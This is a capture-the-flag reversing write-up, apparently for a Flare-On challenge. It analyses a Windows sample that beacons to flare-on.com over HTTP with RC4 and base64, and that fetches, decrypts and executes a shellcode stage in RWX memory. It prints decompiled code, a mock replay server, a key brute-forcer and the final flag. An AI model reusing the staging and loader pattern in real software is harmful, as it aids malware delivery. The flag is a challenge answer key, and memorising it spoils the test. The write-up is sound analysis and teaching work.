# Mics
- Given a PE32 executable and a PCAPNG file

![image](https://github.com/user-attachments/assets/99155344-8d2b-4d18-a42e-8e7c50ce20ca)

# Detailed Analysis
- First when I tried to determine whether any functions are called before `main`, I found a very suspicious looking function
```C
int sub_171020()
{
  struct _SYSTEMTIME SystemTime; // [esp+4h] [ebp-20h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  v2 = 0;
  memmove_thing(&dword_1C0874, L"FO9", 3u);
  GetLocalTime(&SystemTime);
  srand(SystemTime.wMilliseconds + 1000 * (SystemTime.wSecond + 60 * SystemTime.wMinute));
  dword_1C0870 = rand();
  xmmword_1C088C = (__int128)SystemTime;
  return atexit(sub_1ADC50);
}
```
- This function gets the current time then use it as seed for `srand`, the generated random value then appended with `dword_1C0874`. This value will be used later so we will need to remember this

- The `main` function is rather long so I will only go into detail about functions that are crucial for analysis

```C
 for ( i = xmmword_1C088C; moon_phase_calc(i, DWORD1(i)) != 0xF; i = xmmword_1C088C )
    Sleep(0x2932E00u);
```
- First, the `main` function seems to calculate something related to the `moon phase`, when the current date does not corresponse to the full moon, It sleeps until the next full moon
- Then it initialize some strings like `flare-on.com`, `POST` and `ahoy`, based on these strings, we can somewhat guess that the program will be some kind of client that makes some kind of HTTP requests to `flare-on.com` using the `POST` method. One thing to take note is that these strings are in `UTF-16LE` format

![image](https://github.com/user-attachments/assets/5ee9b727-4d70-4460-b767-1afd341bcf06)
![image](https://github.com/user-attachments/assets/9158f6cd-5f1d-4265-95c8-c16cc8761ce7)
![image](https://github.com/user-attachments/assets/21c9a387-e8a1-461a-a33f-236f3e43f846)

- After a little bit of debugging, we come across this md5-like function

![image](https://github.com/user-attachments/assets/0f676f37-6e24-4ba8-a5c2-5b965c6626b8)

```C
void __thiscall sub_1737A0(void **this, _DWORD *Block, int a3, int a4, int a5, int a6, unsigned int a7)
{
  _DWORD **p_Block; // edx
  char *v9; // esi
  char *v10; // ecx
  __int16 v11; // dx
  char *v12; // ecx

  p_Block = &Block;
  if ( a7 >= 8 )
    p_Block = (_DWORD **)Block;
  v9 = (char *)(*((int (__stdcall **)(_DWORD **))*this + 10))(p_Block);// call to md5 hash
  v10 = v9;
  do
  {
    v11 = *(_WORD *)v10;
    v10 += 2;
  }
  while ( v11 );
  memmove_thing(this + 11, v9, (v10 - (v9 + 2)) >> 1);
  j_j__free(v9);
  if ( a7 >= 8 )
  {
    v12 = (char *)Block;
    if ( 2 * a7 + 2 >= 0x1000 )
    {
      v12 = (char *)*(Block - 1);
      if ( (unsigned int)((char *)Block - v12 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    free(v12);
  }
}
```
- When I tried to see what arguments the `md5` function takes. I saw a familliar value

![image](https://github.com/user-attachments/assets/152e6b86-9622-4daa-9ed8-53142151f0ce)

- This is the value(encoded in `UTF-16LE` format) that was generated in `sub_171020`, this value will be hased with md5
- Then comes the `HTTP` function
```C
bool __thiscall send_http_requests(
        WCHAR *this,
        _DWORD *Block,
        int a3,
        int a4,
        int a5,
        int a6,
        unsigned int a7,
        char a8)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  v49 = 0;
  v9 = 2 * a6;
  v35 = (LPDWORD)(2 * a6);
  p_Block = &Block;
  if ( a7 >= 8 )
    p_Block = (_DWORD **)Block;
  v34 = p_Block;
  another_memmove(v33, (_DWORD *)this + 11);
  v11 = (*(int (__thiscall **)(WCHAR *, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, HINTERNET, LPDWORD))(*(_DWORD *)this + 24))(
          this,
          v33[0],
          v33[1],
          v33[2],
          v33[3],
          v33[4],
          v33[5],
          v34,
          v35);                                 // call to RC4
  (*(void (__thiscall **)(WCHAR *, LPVOID *, int, int))(*(_DWORD *)this + 12))(this, lpOptional, v11, v9);// call to b64
  v12 = 0;
  LOBYTE(v49) = 1;
  dwNumberOfBytesRead = 0;
  v38 = 0;
  memset(pszUAOut, 0, sizeof(pszUAOut));
  memset(DstBuf, 0, sizeof(DstBuf));
  cbSize = 512;
  if ( ObtainUserAgentString(0, pszUAOut, &cbSize) )
  {
    if ( v45 >= 8 )
    {
      v13 = lpOptional[0];
      v14 = (DWORD *)(2 * v45 + 2);
      if ( (unsigned int)v14 >= 0x1000 )
      {
        v13 = (void *)*((_DWORD *)lpOptional[0] - 1);
        v14 = (DWORD *)(2 * v45 + 37);
        if ( (unsigned int)(lpOptional[0] - v13 - 4) > 0x1F )
          goto LABEL_50;
      }
      v35 = v14;
      free(v13);
    }
    v44 = 0;
    v45 = 7;
    LOWORD(lpOptional[0]) = 0;
    if ( a7 < 8 )
      return 0;
    v15 = Block;
    v16 = (DWORD *)(2 * a7 + 2);
    if ( (unsigned int)v16 < 0x1000
      || (v15 = (_DWORD *)*(Block - 1),
          v16 = (DWORD *)(2 * a7 + 37),
          (unsigned int)((char *)Block - (char *)v15 - 4) <= 0x1F) )
    {
      v35 = v16;
      free(v15);
      return 0;
    }
LABEL_50:
    _invalid_parameter_noinfo_noreturn();
  }
  if ( cbSize - 2 >= 0x200 )
    __report_rangecheckfailure();
  v18 = dword_1C0870;
  pszUAOut[cbSize - 2] = 0;
  another_memmove_lmao((void **)Source, v18);
  mbstowcs_s(&PtNumOfCharConverted, DstBuf, 0x200u, pszUAOut, strlen(pszUAOut));
  wcscat_s(DstBuf, 0x200u, L"; ");
  if ( a8 )
  {
    v19 = (const wchar_t *)Source;
    if ( v41 >= 8 )
      v19 = Source[0];
  }
  else
  {
    v19 = L"CLR";
  }
  wcscat_s(DstBuf, 0x200u, v19);
  wcscat_s(DstBuf, 0x200u, L")");
  v20 = WinHttpOpen(DstBuf, 0, 0, 0, 0);
  v37 = v20;
  if ( v20 )
  {
    v21 = this + 10;
    if ( *((_DWORD *)this + 10) >= 8u )
      v21 = *(WCHAR **)v21;
    v22 = (void (__stdcall *)(HINTERNET))WinHttpCloseHandle;
    v23 = WinHttpConnect(v20, v21, 0x50u, 0);
    hInternet = v23;
    if ( v23 )
    {
      v24 = WinHttpOpenRequest(v23, this + 2, 0, 0, 0, 0, 0);
      if ( v24 )
      {
        v25 = lpOptional;
        if ( v45 >= 8 )
          v25 = (LPVOID *)lpOptional[0];
        v38 = WinHttpSendRequest(v24, 0, 0, v25, 2 * v44, 2 * v44, 0);
        if ( v38 )
        {
          v38 = WinHttpReceiveResponse(v24, 0);
          if ( v38 )
          {
            v26 = (DWORD *)(this + 36);
            do
            {
              while ( 1 )
              {
                v35 = (LPDWORD)(this + 36);
                v34 = v24;
                *v26 = 0;
                WinHttpQueryDataAvailable(v34, v35);
                if ( *v26 <= 0x800 )
                  break;
                *((_DWORD *)this + 18) = 2048;
              }
              WinHttpReadData(v24, *((LPVOID *)this + 17), *v26, &dwNumberOfBytesRead);
            }
            while ( *((_DWORD *)this + 18) );
            v22 = (void (__stdcall *)(HINTERNET))WinHttpCloseHandle;
          }
        }
        v22(v24);
      }
      v22(hInternet);
      v12 = v38;
    }
    v22(v37);
  }
  if ( v41 >= 8 )
  {
    v27 = Source[0];
    v28 = (DWORD *)(2 * v41 + 2);
    if ( (unsigned int)v28 >= 0x1000 )
    {
      v27 = (wchar_t *)*((_DWORD *)Source[0] - 1);
      v28 = (DWORD *)(2 * v41 + 37);
      if ( (unsigned int)((char *)Source[0] - (char *)v27 - 4) > 0x1F )
        goto LABEL_50;
    }
    v35 = v28;
    free(v27);
  }
  Source[4] = 0;
  v41 = 7;
  LOWORD(Source[0]) = 0;
  if ( v45 >= 8 )
  {
    v29 = lpOptional[0];
    v30 = (DWORD *)(2 * v45 + 2);
    if ( (unsigned int)v30 >= 0x1000 )
    {
      v29 = (void *)*((_DWORD *)lpOptional[0] - 1);
      v30 = (DWORD *)(2 * v45 + 37);
      if ( (unsigned int)(lpOptional[0] - v29 - 4) > 0x1F )
        goto LABEL_50;
    }
    v35 = v30;
    free(v29);
  }
  v44 = 0;
  v45 = 7;
  LOWORD(lpOptional[0]) = 0;
  if ( a7 >= 8 )
  {
    v31 = (char *)Block;
    v32 = (DWORD *)(2 * a7 + 2);
    if ( (unsigned int)v32 >= 0x1000 )
    {
      v31 = (char *)*(Block - 1);
      v32 = (DWORD *)(2 * a7 + 37);
      if ( (unsigned int)((char *)Block - v31 - 4) > 0x1F )
        goto LABEL_50;
    }
    v35 = v32;
    free(v31);
  }
  return v12;
}
```
- First, this function will used the hased `md5` value as key and string `ahoy` as plaintext for `RC4` encryption, then encoded the encrypted data in base64 then finally sent the encoded data to `flare-on.com` (HTTP protocol with POST method) and receive the server's response. Knowing that we are also given a `PCAPNG` file, I decided to build a server in python that emulates the HTTP protocol (with `flare-on.com` points to `localhost` (you can change the dns information in `C:\Windows\System32\drivers\etc\hosts`)
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import base64

class Base64ResponseHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Read the length of the incoming data
        content_length = int(self.headers.get('Content-Length', 0))
        
        # Read the data sent in the POST request
        post_data = self.rfile.read(content_length).decode('utf-8')

        # Log the received data
        print(f"Received POST data: {post_data}")
        
        
        # Encode the response text in Base64a
        encoded_response = "TdQdBRa1nxGU06dbB27E7SQ7TJ2+cd7zstLXRQcLbmh2nTvDm1p5IfT/Cu0JxShk6tHQBRWwPlo9zA1dISfslkLgGDs41WK12ibWIflqLE4Yq3OYIEnLNjwVHrjL2U4Lu3ms+HQc4nfMWXPgcOHb4fhokk93/AJd5GTuC5z+4YsmgRh1Z90yinLBKB+fmGUyagT6gon/KHmJdvAOQ8nAnl8K/0XG+8zYQbZRwgY6tHvvpfyn9OXCyuct5/cOi8KWgALvVHQWafrp8qB/JtT+t5zmnezQlp3zPL4sj2CJfcUTK5copbZCyHexVD4jJN+LezJEtrDXP1DJNg=="
        
        # Send HTTP response headers
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()

        # Write the Base64-encoded response back
        self.wfile.write(encoded_response.encode("utf-8"))

        # Notify that the response was sent
        print(f"Base64-encoded response sent: {encoded_response}")

# Server details
host = "localhost"
port = 80

# Create and start the server
server = HTTPServer((host, port), Base64ResponseHandler)
print(f"Handling POST requests on http://{host}:{port}")
try:
    server.serve_forever()
except KeyboardInterrupt:
    print("\nShutting down the server...")
    server.server_close()

```
- Run the server to confirm that it is working

![image](https://github.com/user-attachments/assets/ce77a718-5fbd-4317-83c9-0ca562aab669)
![image](https://github.com/user-attachments/assets/ccc4cbf4-be05-43e2-88c8-df71d9923c1e)

```C
wchar_t *__thiscall b64_decode_and_rc4_decode(void *this, wchar_t *a2)
{
  wchar_t *v2; // esi
  wchar_t *v3; // eax
  unsigned int *v4; // ecx
  int v5; // eax
  unsigned int v6; // kr00_4
  int v7; // edx
  int v8; // edi
  void **v9; // esi
  void *v10; // ecx
  wchar_t *v11; // ecx
  int v13; // [esp+10h] [ebp-4Ch]
  wchar_t *Context; // [esp+14h] [ebp-48h] BYREF
  wchar_t *String[5]; // [esp+18h] [ebp-44h] BYREF
  unsigned int v16; // [esp+2Ch] [ebp-30h]
  void *Block[4]; // [esp+30h] [ebp-2Ch] BYREF
  int v18; // [esp+40h] [ebp-1Ch]
  unsigned int v19; // [esp+44h] [ebp-18h]
  int Src; // [esp+48h] [ebp-14h] BYREF
  int v21; // [esp+58h] [ebp-4h]

  v2 = a2;
  Context = a2;
  (*(void (__thiscall **)(void *, wchar_t **))(*(_DWORD *)this + 36))(this, String);// call to base64_decode and RC4
  v21 = 0;
  v3 = (wchar_t *)String;
  if ( v16 >= 8 )
    v3 = String[0];
  v4 = (unsigned int *)wcstok_s(v3, L",", &Context);
  v18 = 0;
  v19 = 7;
  LOWORD(Block[0]) = 0;
  LOBYTE(v21) = 1;
  if ( v4 )                                     // generate decrypted data
  {
    do
    {
      v5 = moon_phase_calc(*v4, v4[1]);
      Src = (unsigned __int16)sub_1741E0(v5);
      v6 = wcslen((const unsigned __int16 *)&Src);
      v7 = v18;
      if ( v6 > v19 - v18 )
      {
        LOBYTE(v13) = 0;
        still_memmove(Block, v6, v13, &Src, v6);
      }
      else
      {
        v8 = v18 + v6;
        v9 = Block;
        v18 += v6;
        if ( v19 >= 8 )
          v9 = (void **)Block[0];
        memmove((char *)v9 + 2 * v7, &Src, 2 * v6);
        *((_WORD *)v9 + v8) = 0;
      }
      v4 = (unsigned int *)wcstok_s(0, L",", &Context);
    }
    while ( v4 );
    v2 = a2;
  }
  another_memmove(v2, Block);
  if ( v19 >= 8 )
  {
    v10 = Block[0];
    if ( 2 * v19 + 2 >= 0x1000 )
    {
      v10 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v10 - 4) > 0x1F )
        goto LABEL_20;
    }
    free(v10);
  }
  v18 = 0;
  v19 = 7;
  LOWORD(Block[0]) = 0;
  if ( v16 >= 8 )
  {
    v11 = String[0];
    if ( 2 * v16 + 2 < 0x1000
      || (v11 = (wchar_t *)*((_DWORD *)String[0] - 1), (unsigned int)((char *)String[0] - (char *)v11 - 4) <= 0x1F) )
    {
      free(v11);
      return v2;
    }
LABEL_20:
    _invalid_parameter_noinfo_noreturn();
  }
  return v2;
}
```
- Next,this function will decode the response form base64 and decrypt it with RC4(with the same key from the decryption process). Knowing that the key is randomly generated, i wrote a script to find the right key (cyphertext provided by the `PCAPNG` file)
```python
import base64 as b64
import Crypto.Cipher.ARC4 as RC4
from hashlib import md5
from itertools import product

key_prefix = "FO".encode("utf-16le")
cyphertext = b"ydN8BXq16RE="
plaintext = "ahoy".encode("utf-16le")
for c in product("0123456789",repeat=6):
    suffix = "".join(c).encode("utf-16le")
    true_key = key_prefix + suffix
    hash = md5(true_key).hexdigest()
    utf_16le_key = hash.encode("utf-16le")
    cypher = RC4.new(utf_16le_key)
    b64_cypher = b64.b64encode(cypher.encrypt(plaintext))
    if b64_cypher == cyphertext:
        print(true_key.decode("utf-8"))

```
- Patching the right key into the memory, after a bit of debugging and we have the flag

![image](https://github.com/user-attachments/assets/cc37edb4-90df-44a5-873a-7aab7245bff5)

- But thats only the first tcp stream of the `PCAPNG` file, so what is the second one for? Keep debugging and you will see this function
```C
void __thiscall sub_173AC0(void *this)
{
  void (*v2)(void); // eax
  void **v3; // ecx
  void (*v4)(void); // esi
  void *v5; // ecx
  void *v6; // ecx
  void *v7[9]; // [esp-18h] [ebp-64h] BYREF
  void *Block[5]; // [esp+Ch] [ebp-40h] BYREF
  unsigned int v9; // [esp+20h] [ebp-2Ch]
  void *Src[5]; // [esp+24h] [ebp-28h] BYREF
  unsigned int v11; // [esp+38h] [ebp-14h]
  int v12; // [esp+48h] [ebp-4h]

  Block[4] = 0;
  v9 = 7;
  LOWORD(Block[0]) = 0;
  memmove_thing(Block, L"sce", 3u);
  v7[6] = 0;
  v12 = 0;
  another_memmove(v7, Block);
  (*(void (__thiscall **)(void *))(*(_DWORD *)this + 28))(this);// call to http 
  (*(void (__thiscall **)(void *, void **))(*(_DWORD *)this + 36))(this, Src);// call to base64 decode and rc4 decrypt
  LOBYTE(v12) = 1;
  v2 = (void (*)(void))VirtualAlloc(0, 0x2000u, 0x3000u, 0x40u);
  v3 = Src;
  if ( v11 >= 8 )
    v3 = (void **)Src[0];
  v4 = v2;
  memmove(v2, v3, 0x2000u);
  v4();
  if ( v11 >= 8 )
  {
    v5 = Src[0];
    if ( 2 * v11 + 2 >= 0x1000 )
    {
      v5 = (void *)*((_DWORD *)Src[0] - 1);
      if ( (unsigned int)(Src[0] - v5 - 4) > 0x1F )
        goto LABEL_12;
    }
    free(v5);
  }
  Src[4] = 0;
  v11 = 7;
  LOWORD(Src[0]) = 0;
  if ( v9 < 8 )
    return;
  v6 = Block[0];
  if ( 2 * v9 + 2 >= 0x1000 )
  {
    v6 = (void *)*((_DWORD *)Block[0] - 1);
    if ( (unsigned int)(Block[0] - v6 - 4) > 0x1F )
LABEL_12:
      _invalid_parameter_noinfo_noreturn();
  }
  free(v6);
}
```
- This function will take our md5 hashed flag as key and string `sce` for RC4 encryption, then encode cyphertext in base64 and send it to server, the server then send back base64 encoded data and this function will decode it and decrypt it using RC4 (same key). Allocate a memory region that has `PAGE_EXECUTE_READWRITE` attribute then execute it, so i updated my http server code as follows
```python
from http.server import HTTPServer, BaseHTTPRequestHandler

# Global toggle variable
toggle = 0

class Base64ResponseHandler(BaseHTTPRequestHandler):
    response_data = [
        "TdQdBRa1nxGU06dbB27E7SQ7TJ2+cd7zstLXRQcLbmh2nTvDm1p5IfT/Cu0JxShk6tHQBRWwPlo9zA1dISfslkLgGDs41WK12ibWIflqLE4Yq3OYIEnLNjwVHrjL2U4Lu3ms+HQc4nfMWXPgcOHb4fhokk93/AJd5GTuC5z+4YsmgRh1Z90yinLBKB+fmGUyagT6gon/KHmJdvAOQ8nAnl8K/0XG+8zYQbZRwgY6tHvvpfyn9OXCyuct5/cOi8KWgALvVHQWafrp8qB/JtT+t5zmnezQlp3zPL4sj2CJfcUTK5copbZCyHexVD4jJN+LezJEtrDXP1DJNg==",
        "F1KFlZbNGuKQxrTD/ORwudM8S8kKiL5F906YlR8TKd8XrKPeDYZ0HouiBamyQf9/Ns7u3C2UEMLoCA0B8EuZp1FpwnedVjPSdZFjkieYqWzKA7up+LYe9B4dmAUM2lYkmBSqPJYT6nEg27n3X656MMOxNIHt0HsOD0d+"
    ]

    def do_POST(self):
        global toggle  # Use the global toggle variable

        # Read the length of the incoming data
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        print(f"Received POST data: {post_data}")

        # Select response and toggle
        encoded_response = self.response_data[toggle]
        toggle = 1 - toggle  # Switch between 0 and 1

        # Send response
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(encoded_response.encode("utf-8"))

        print(f"Base64-encoded response sent: {encoded_response}")

# Server details
host = "localhost"
port = 80  # Port 80 requires admin privileges, so use 8080 instead

# Create and start the server
server = HTTPServer((host, port), Base64ResponseHandler)
print(f"Handling POST requests on http://{host}:{port}")

try:
    server.serve_forever()
except KeyboardInterrupt:
    print("\nShutting down the server...")
    server.server_close()

```
![image](https://github.com/user-attachments/assets/a1901803-c939-494a-9ee7-b292aa50bba2)
# Script and Flag
**Flag:** `i_s33_you_m00n@flare-on.com`
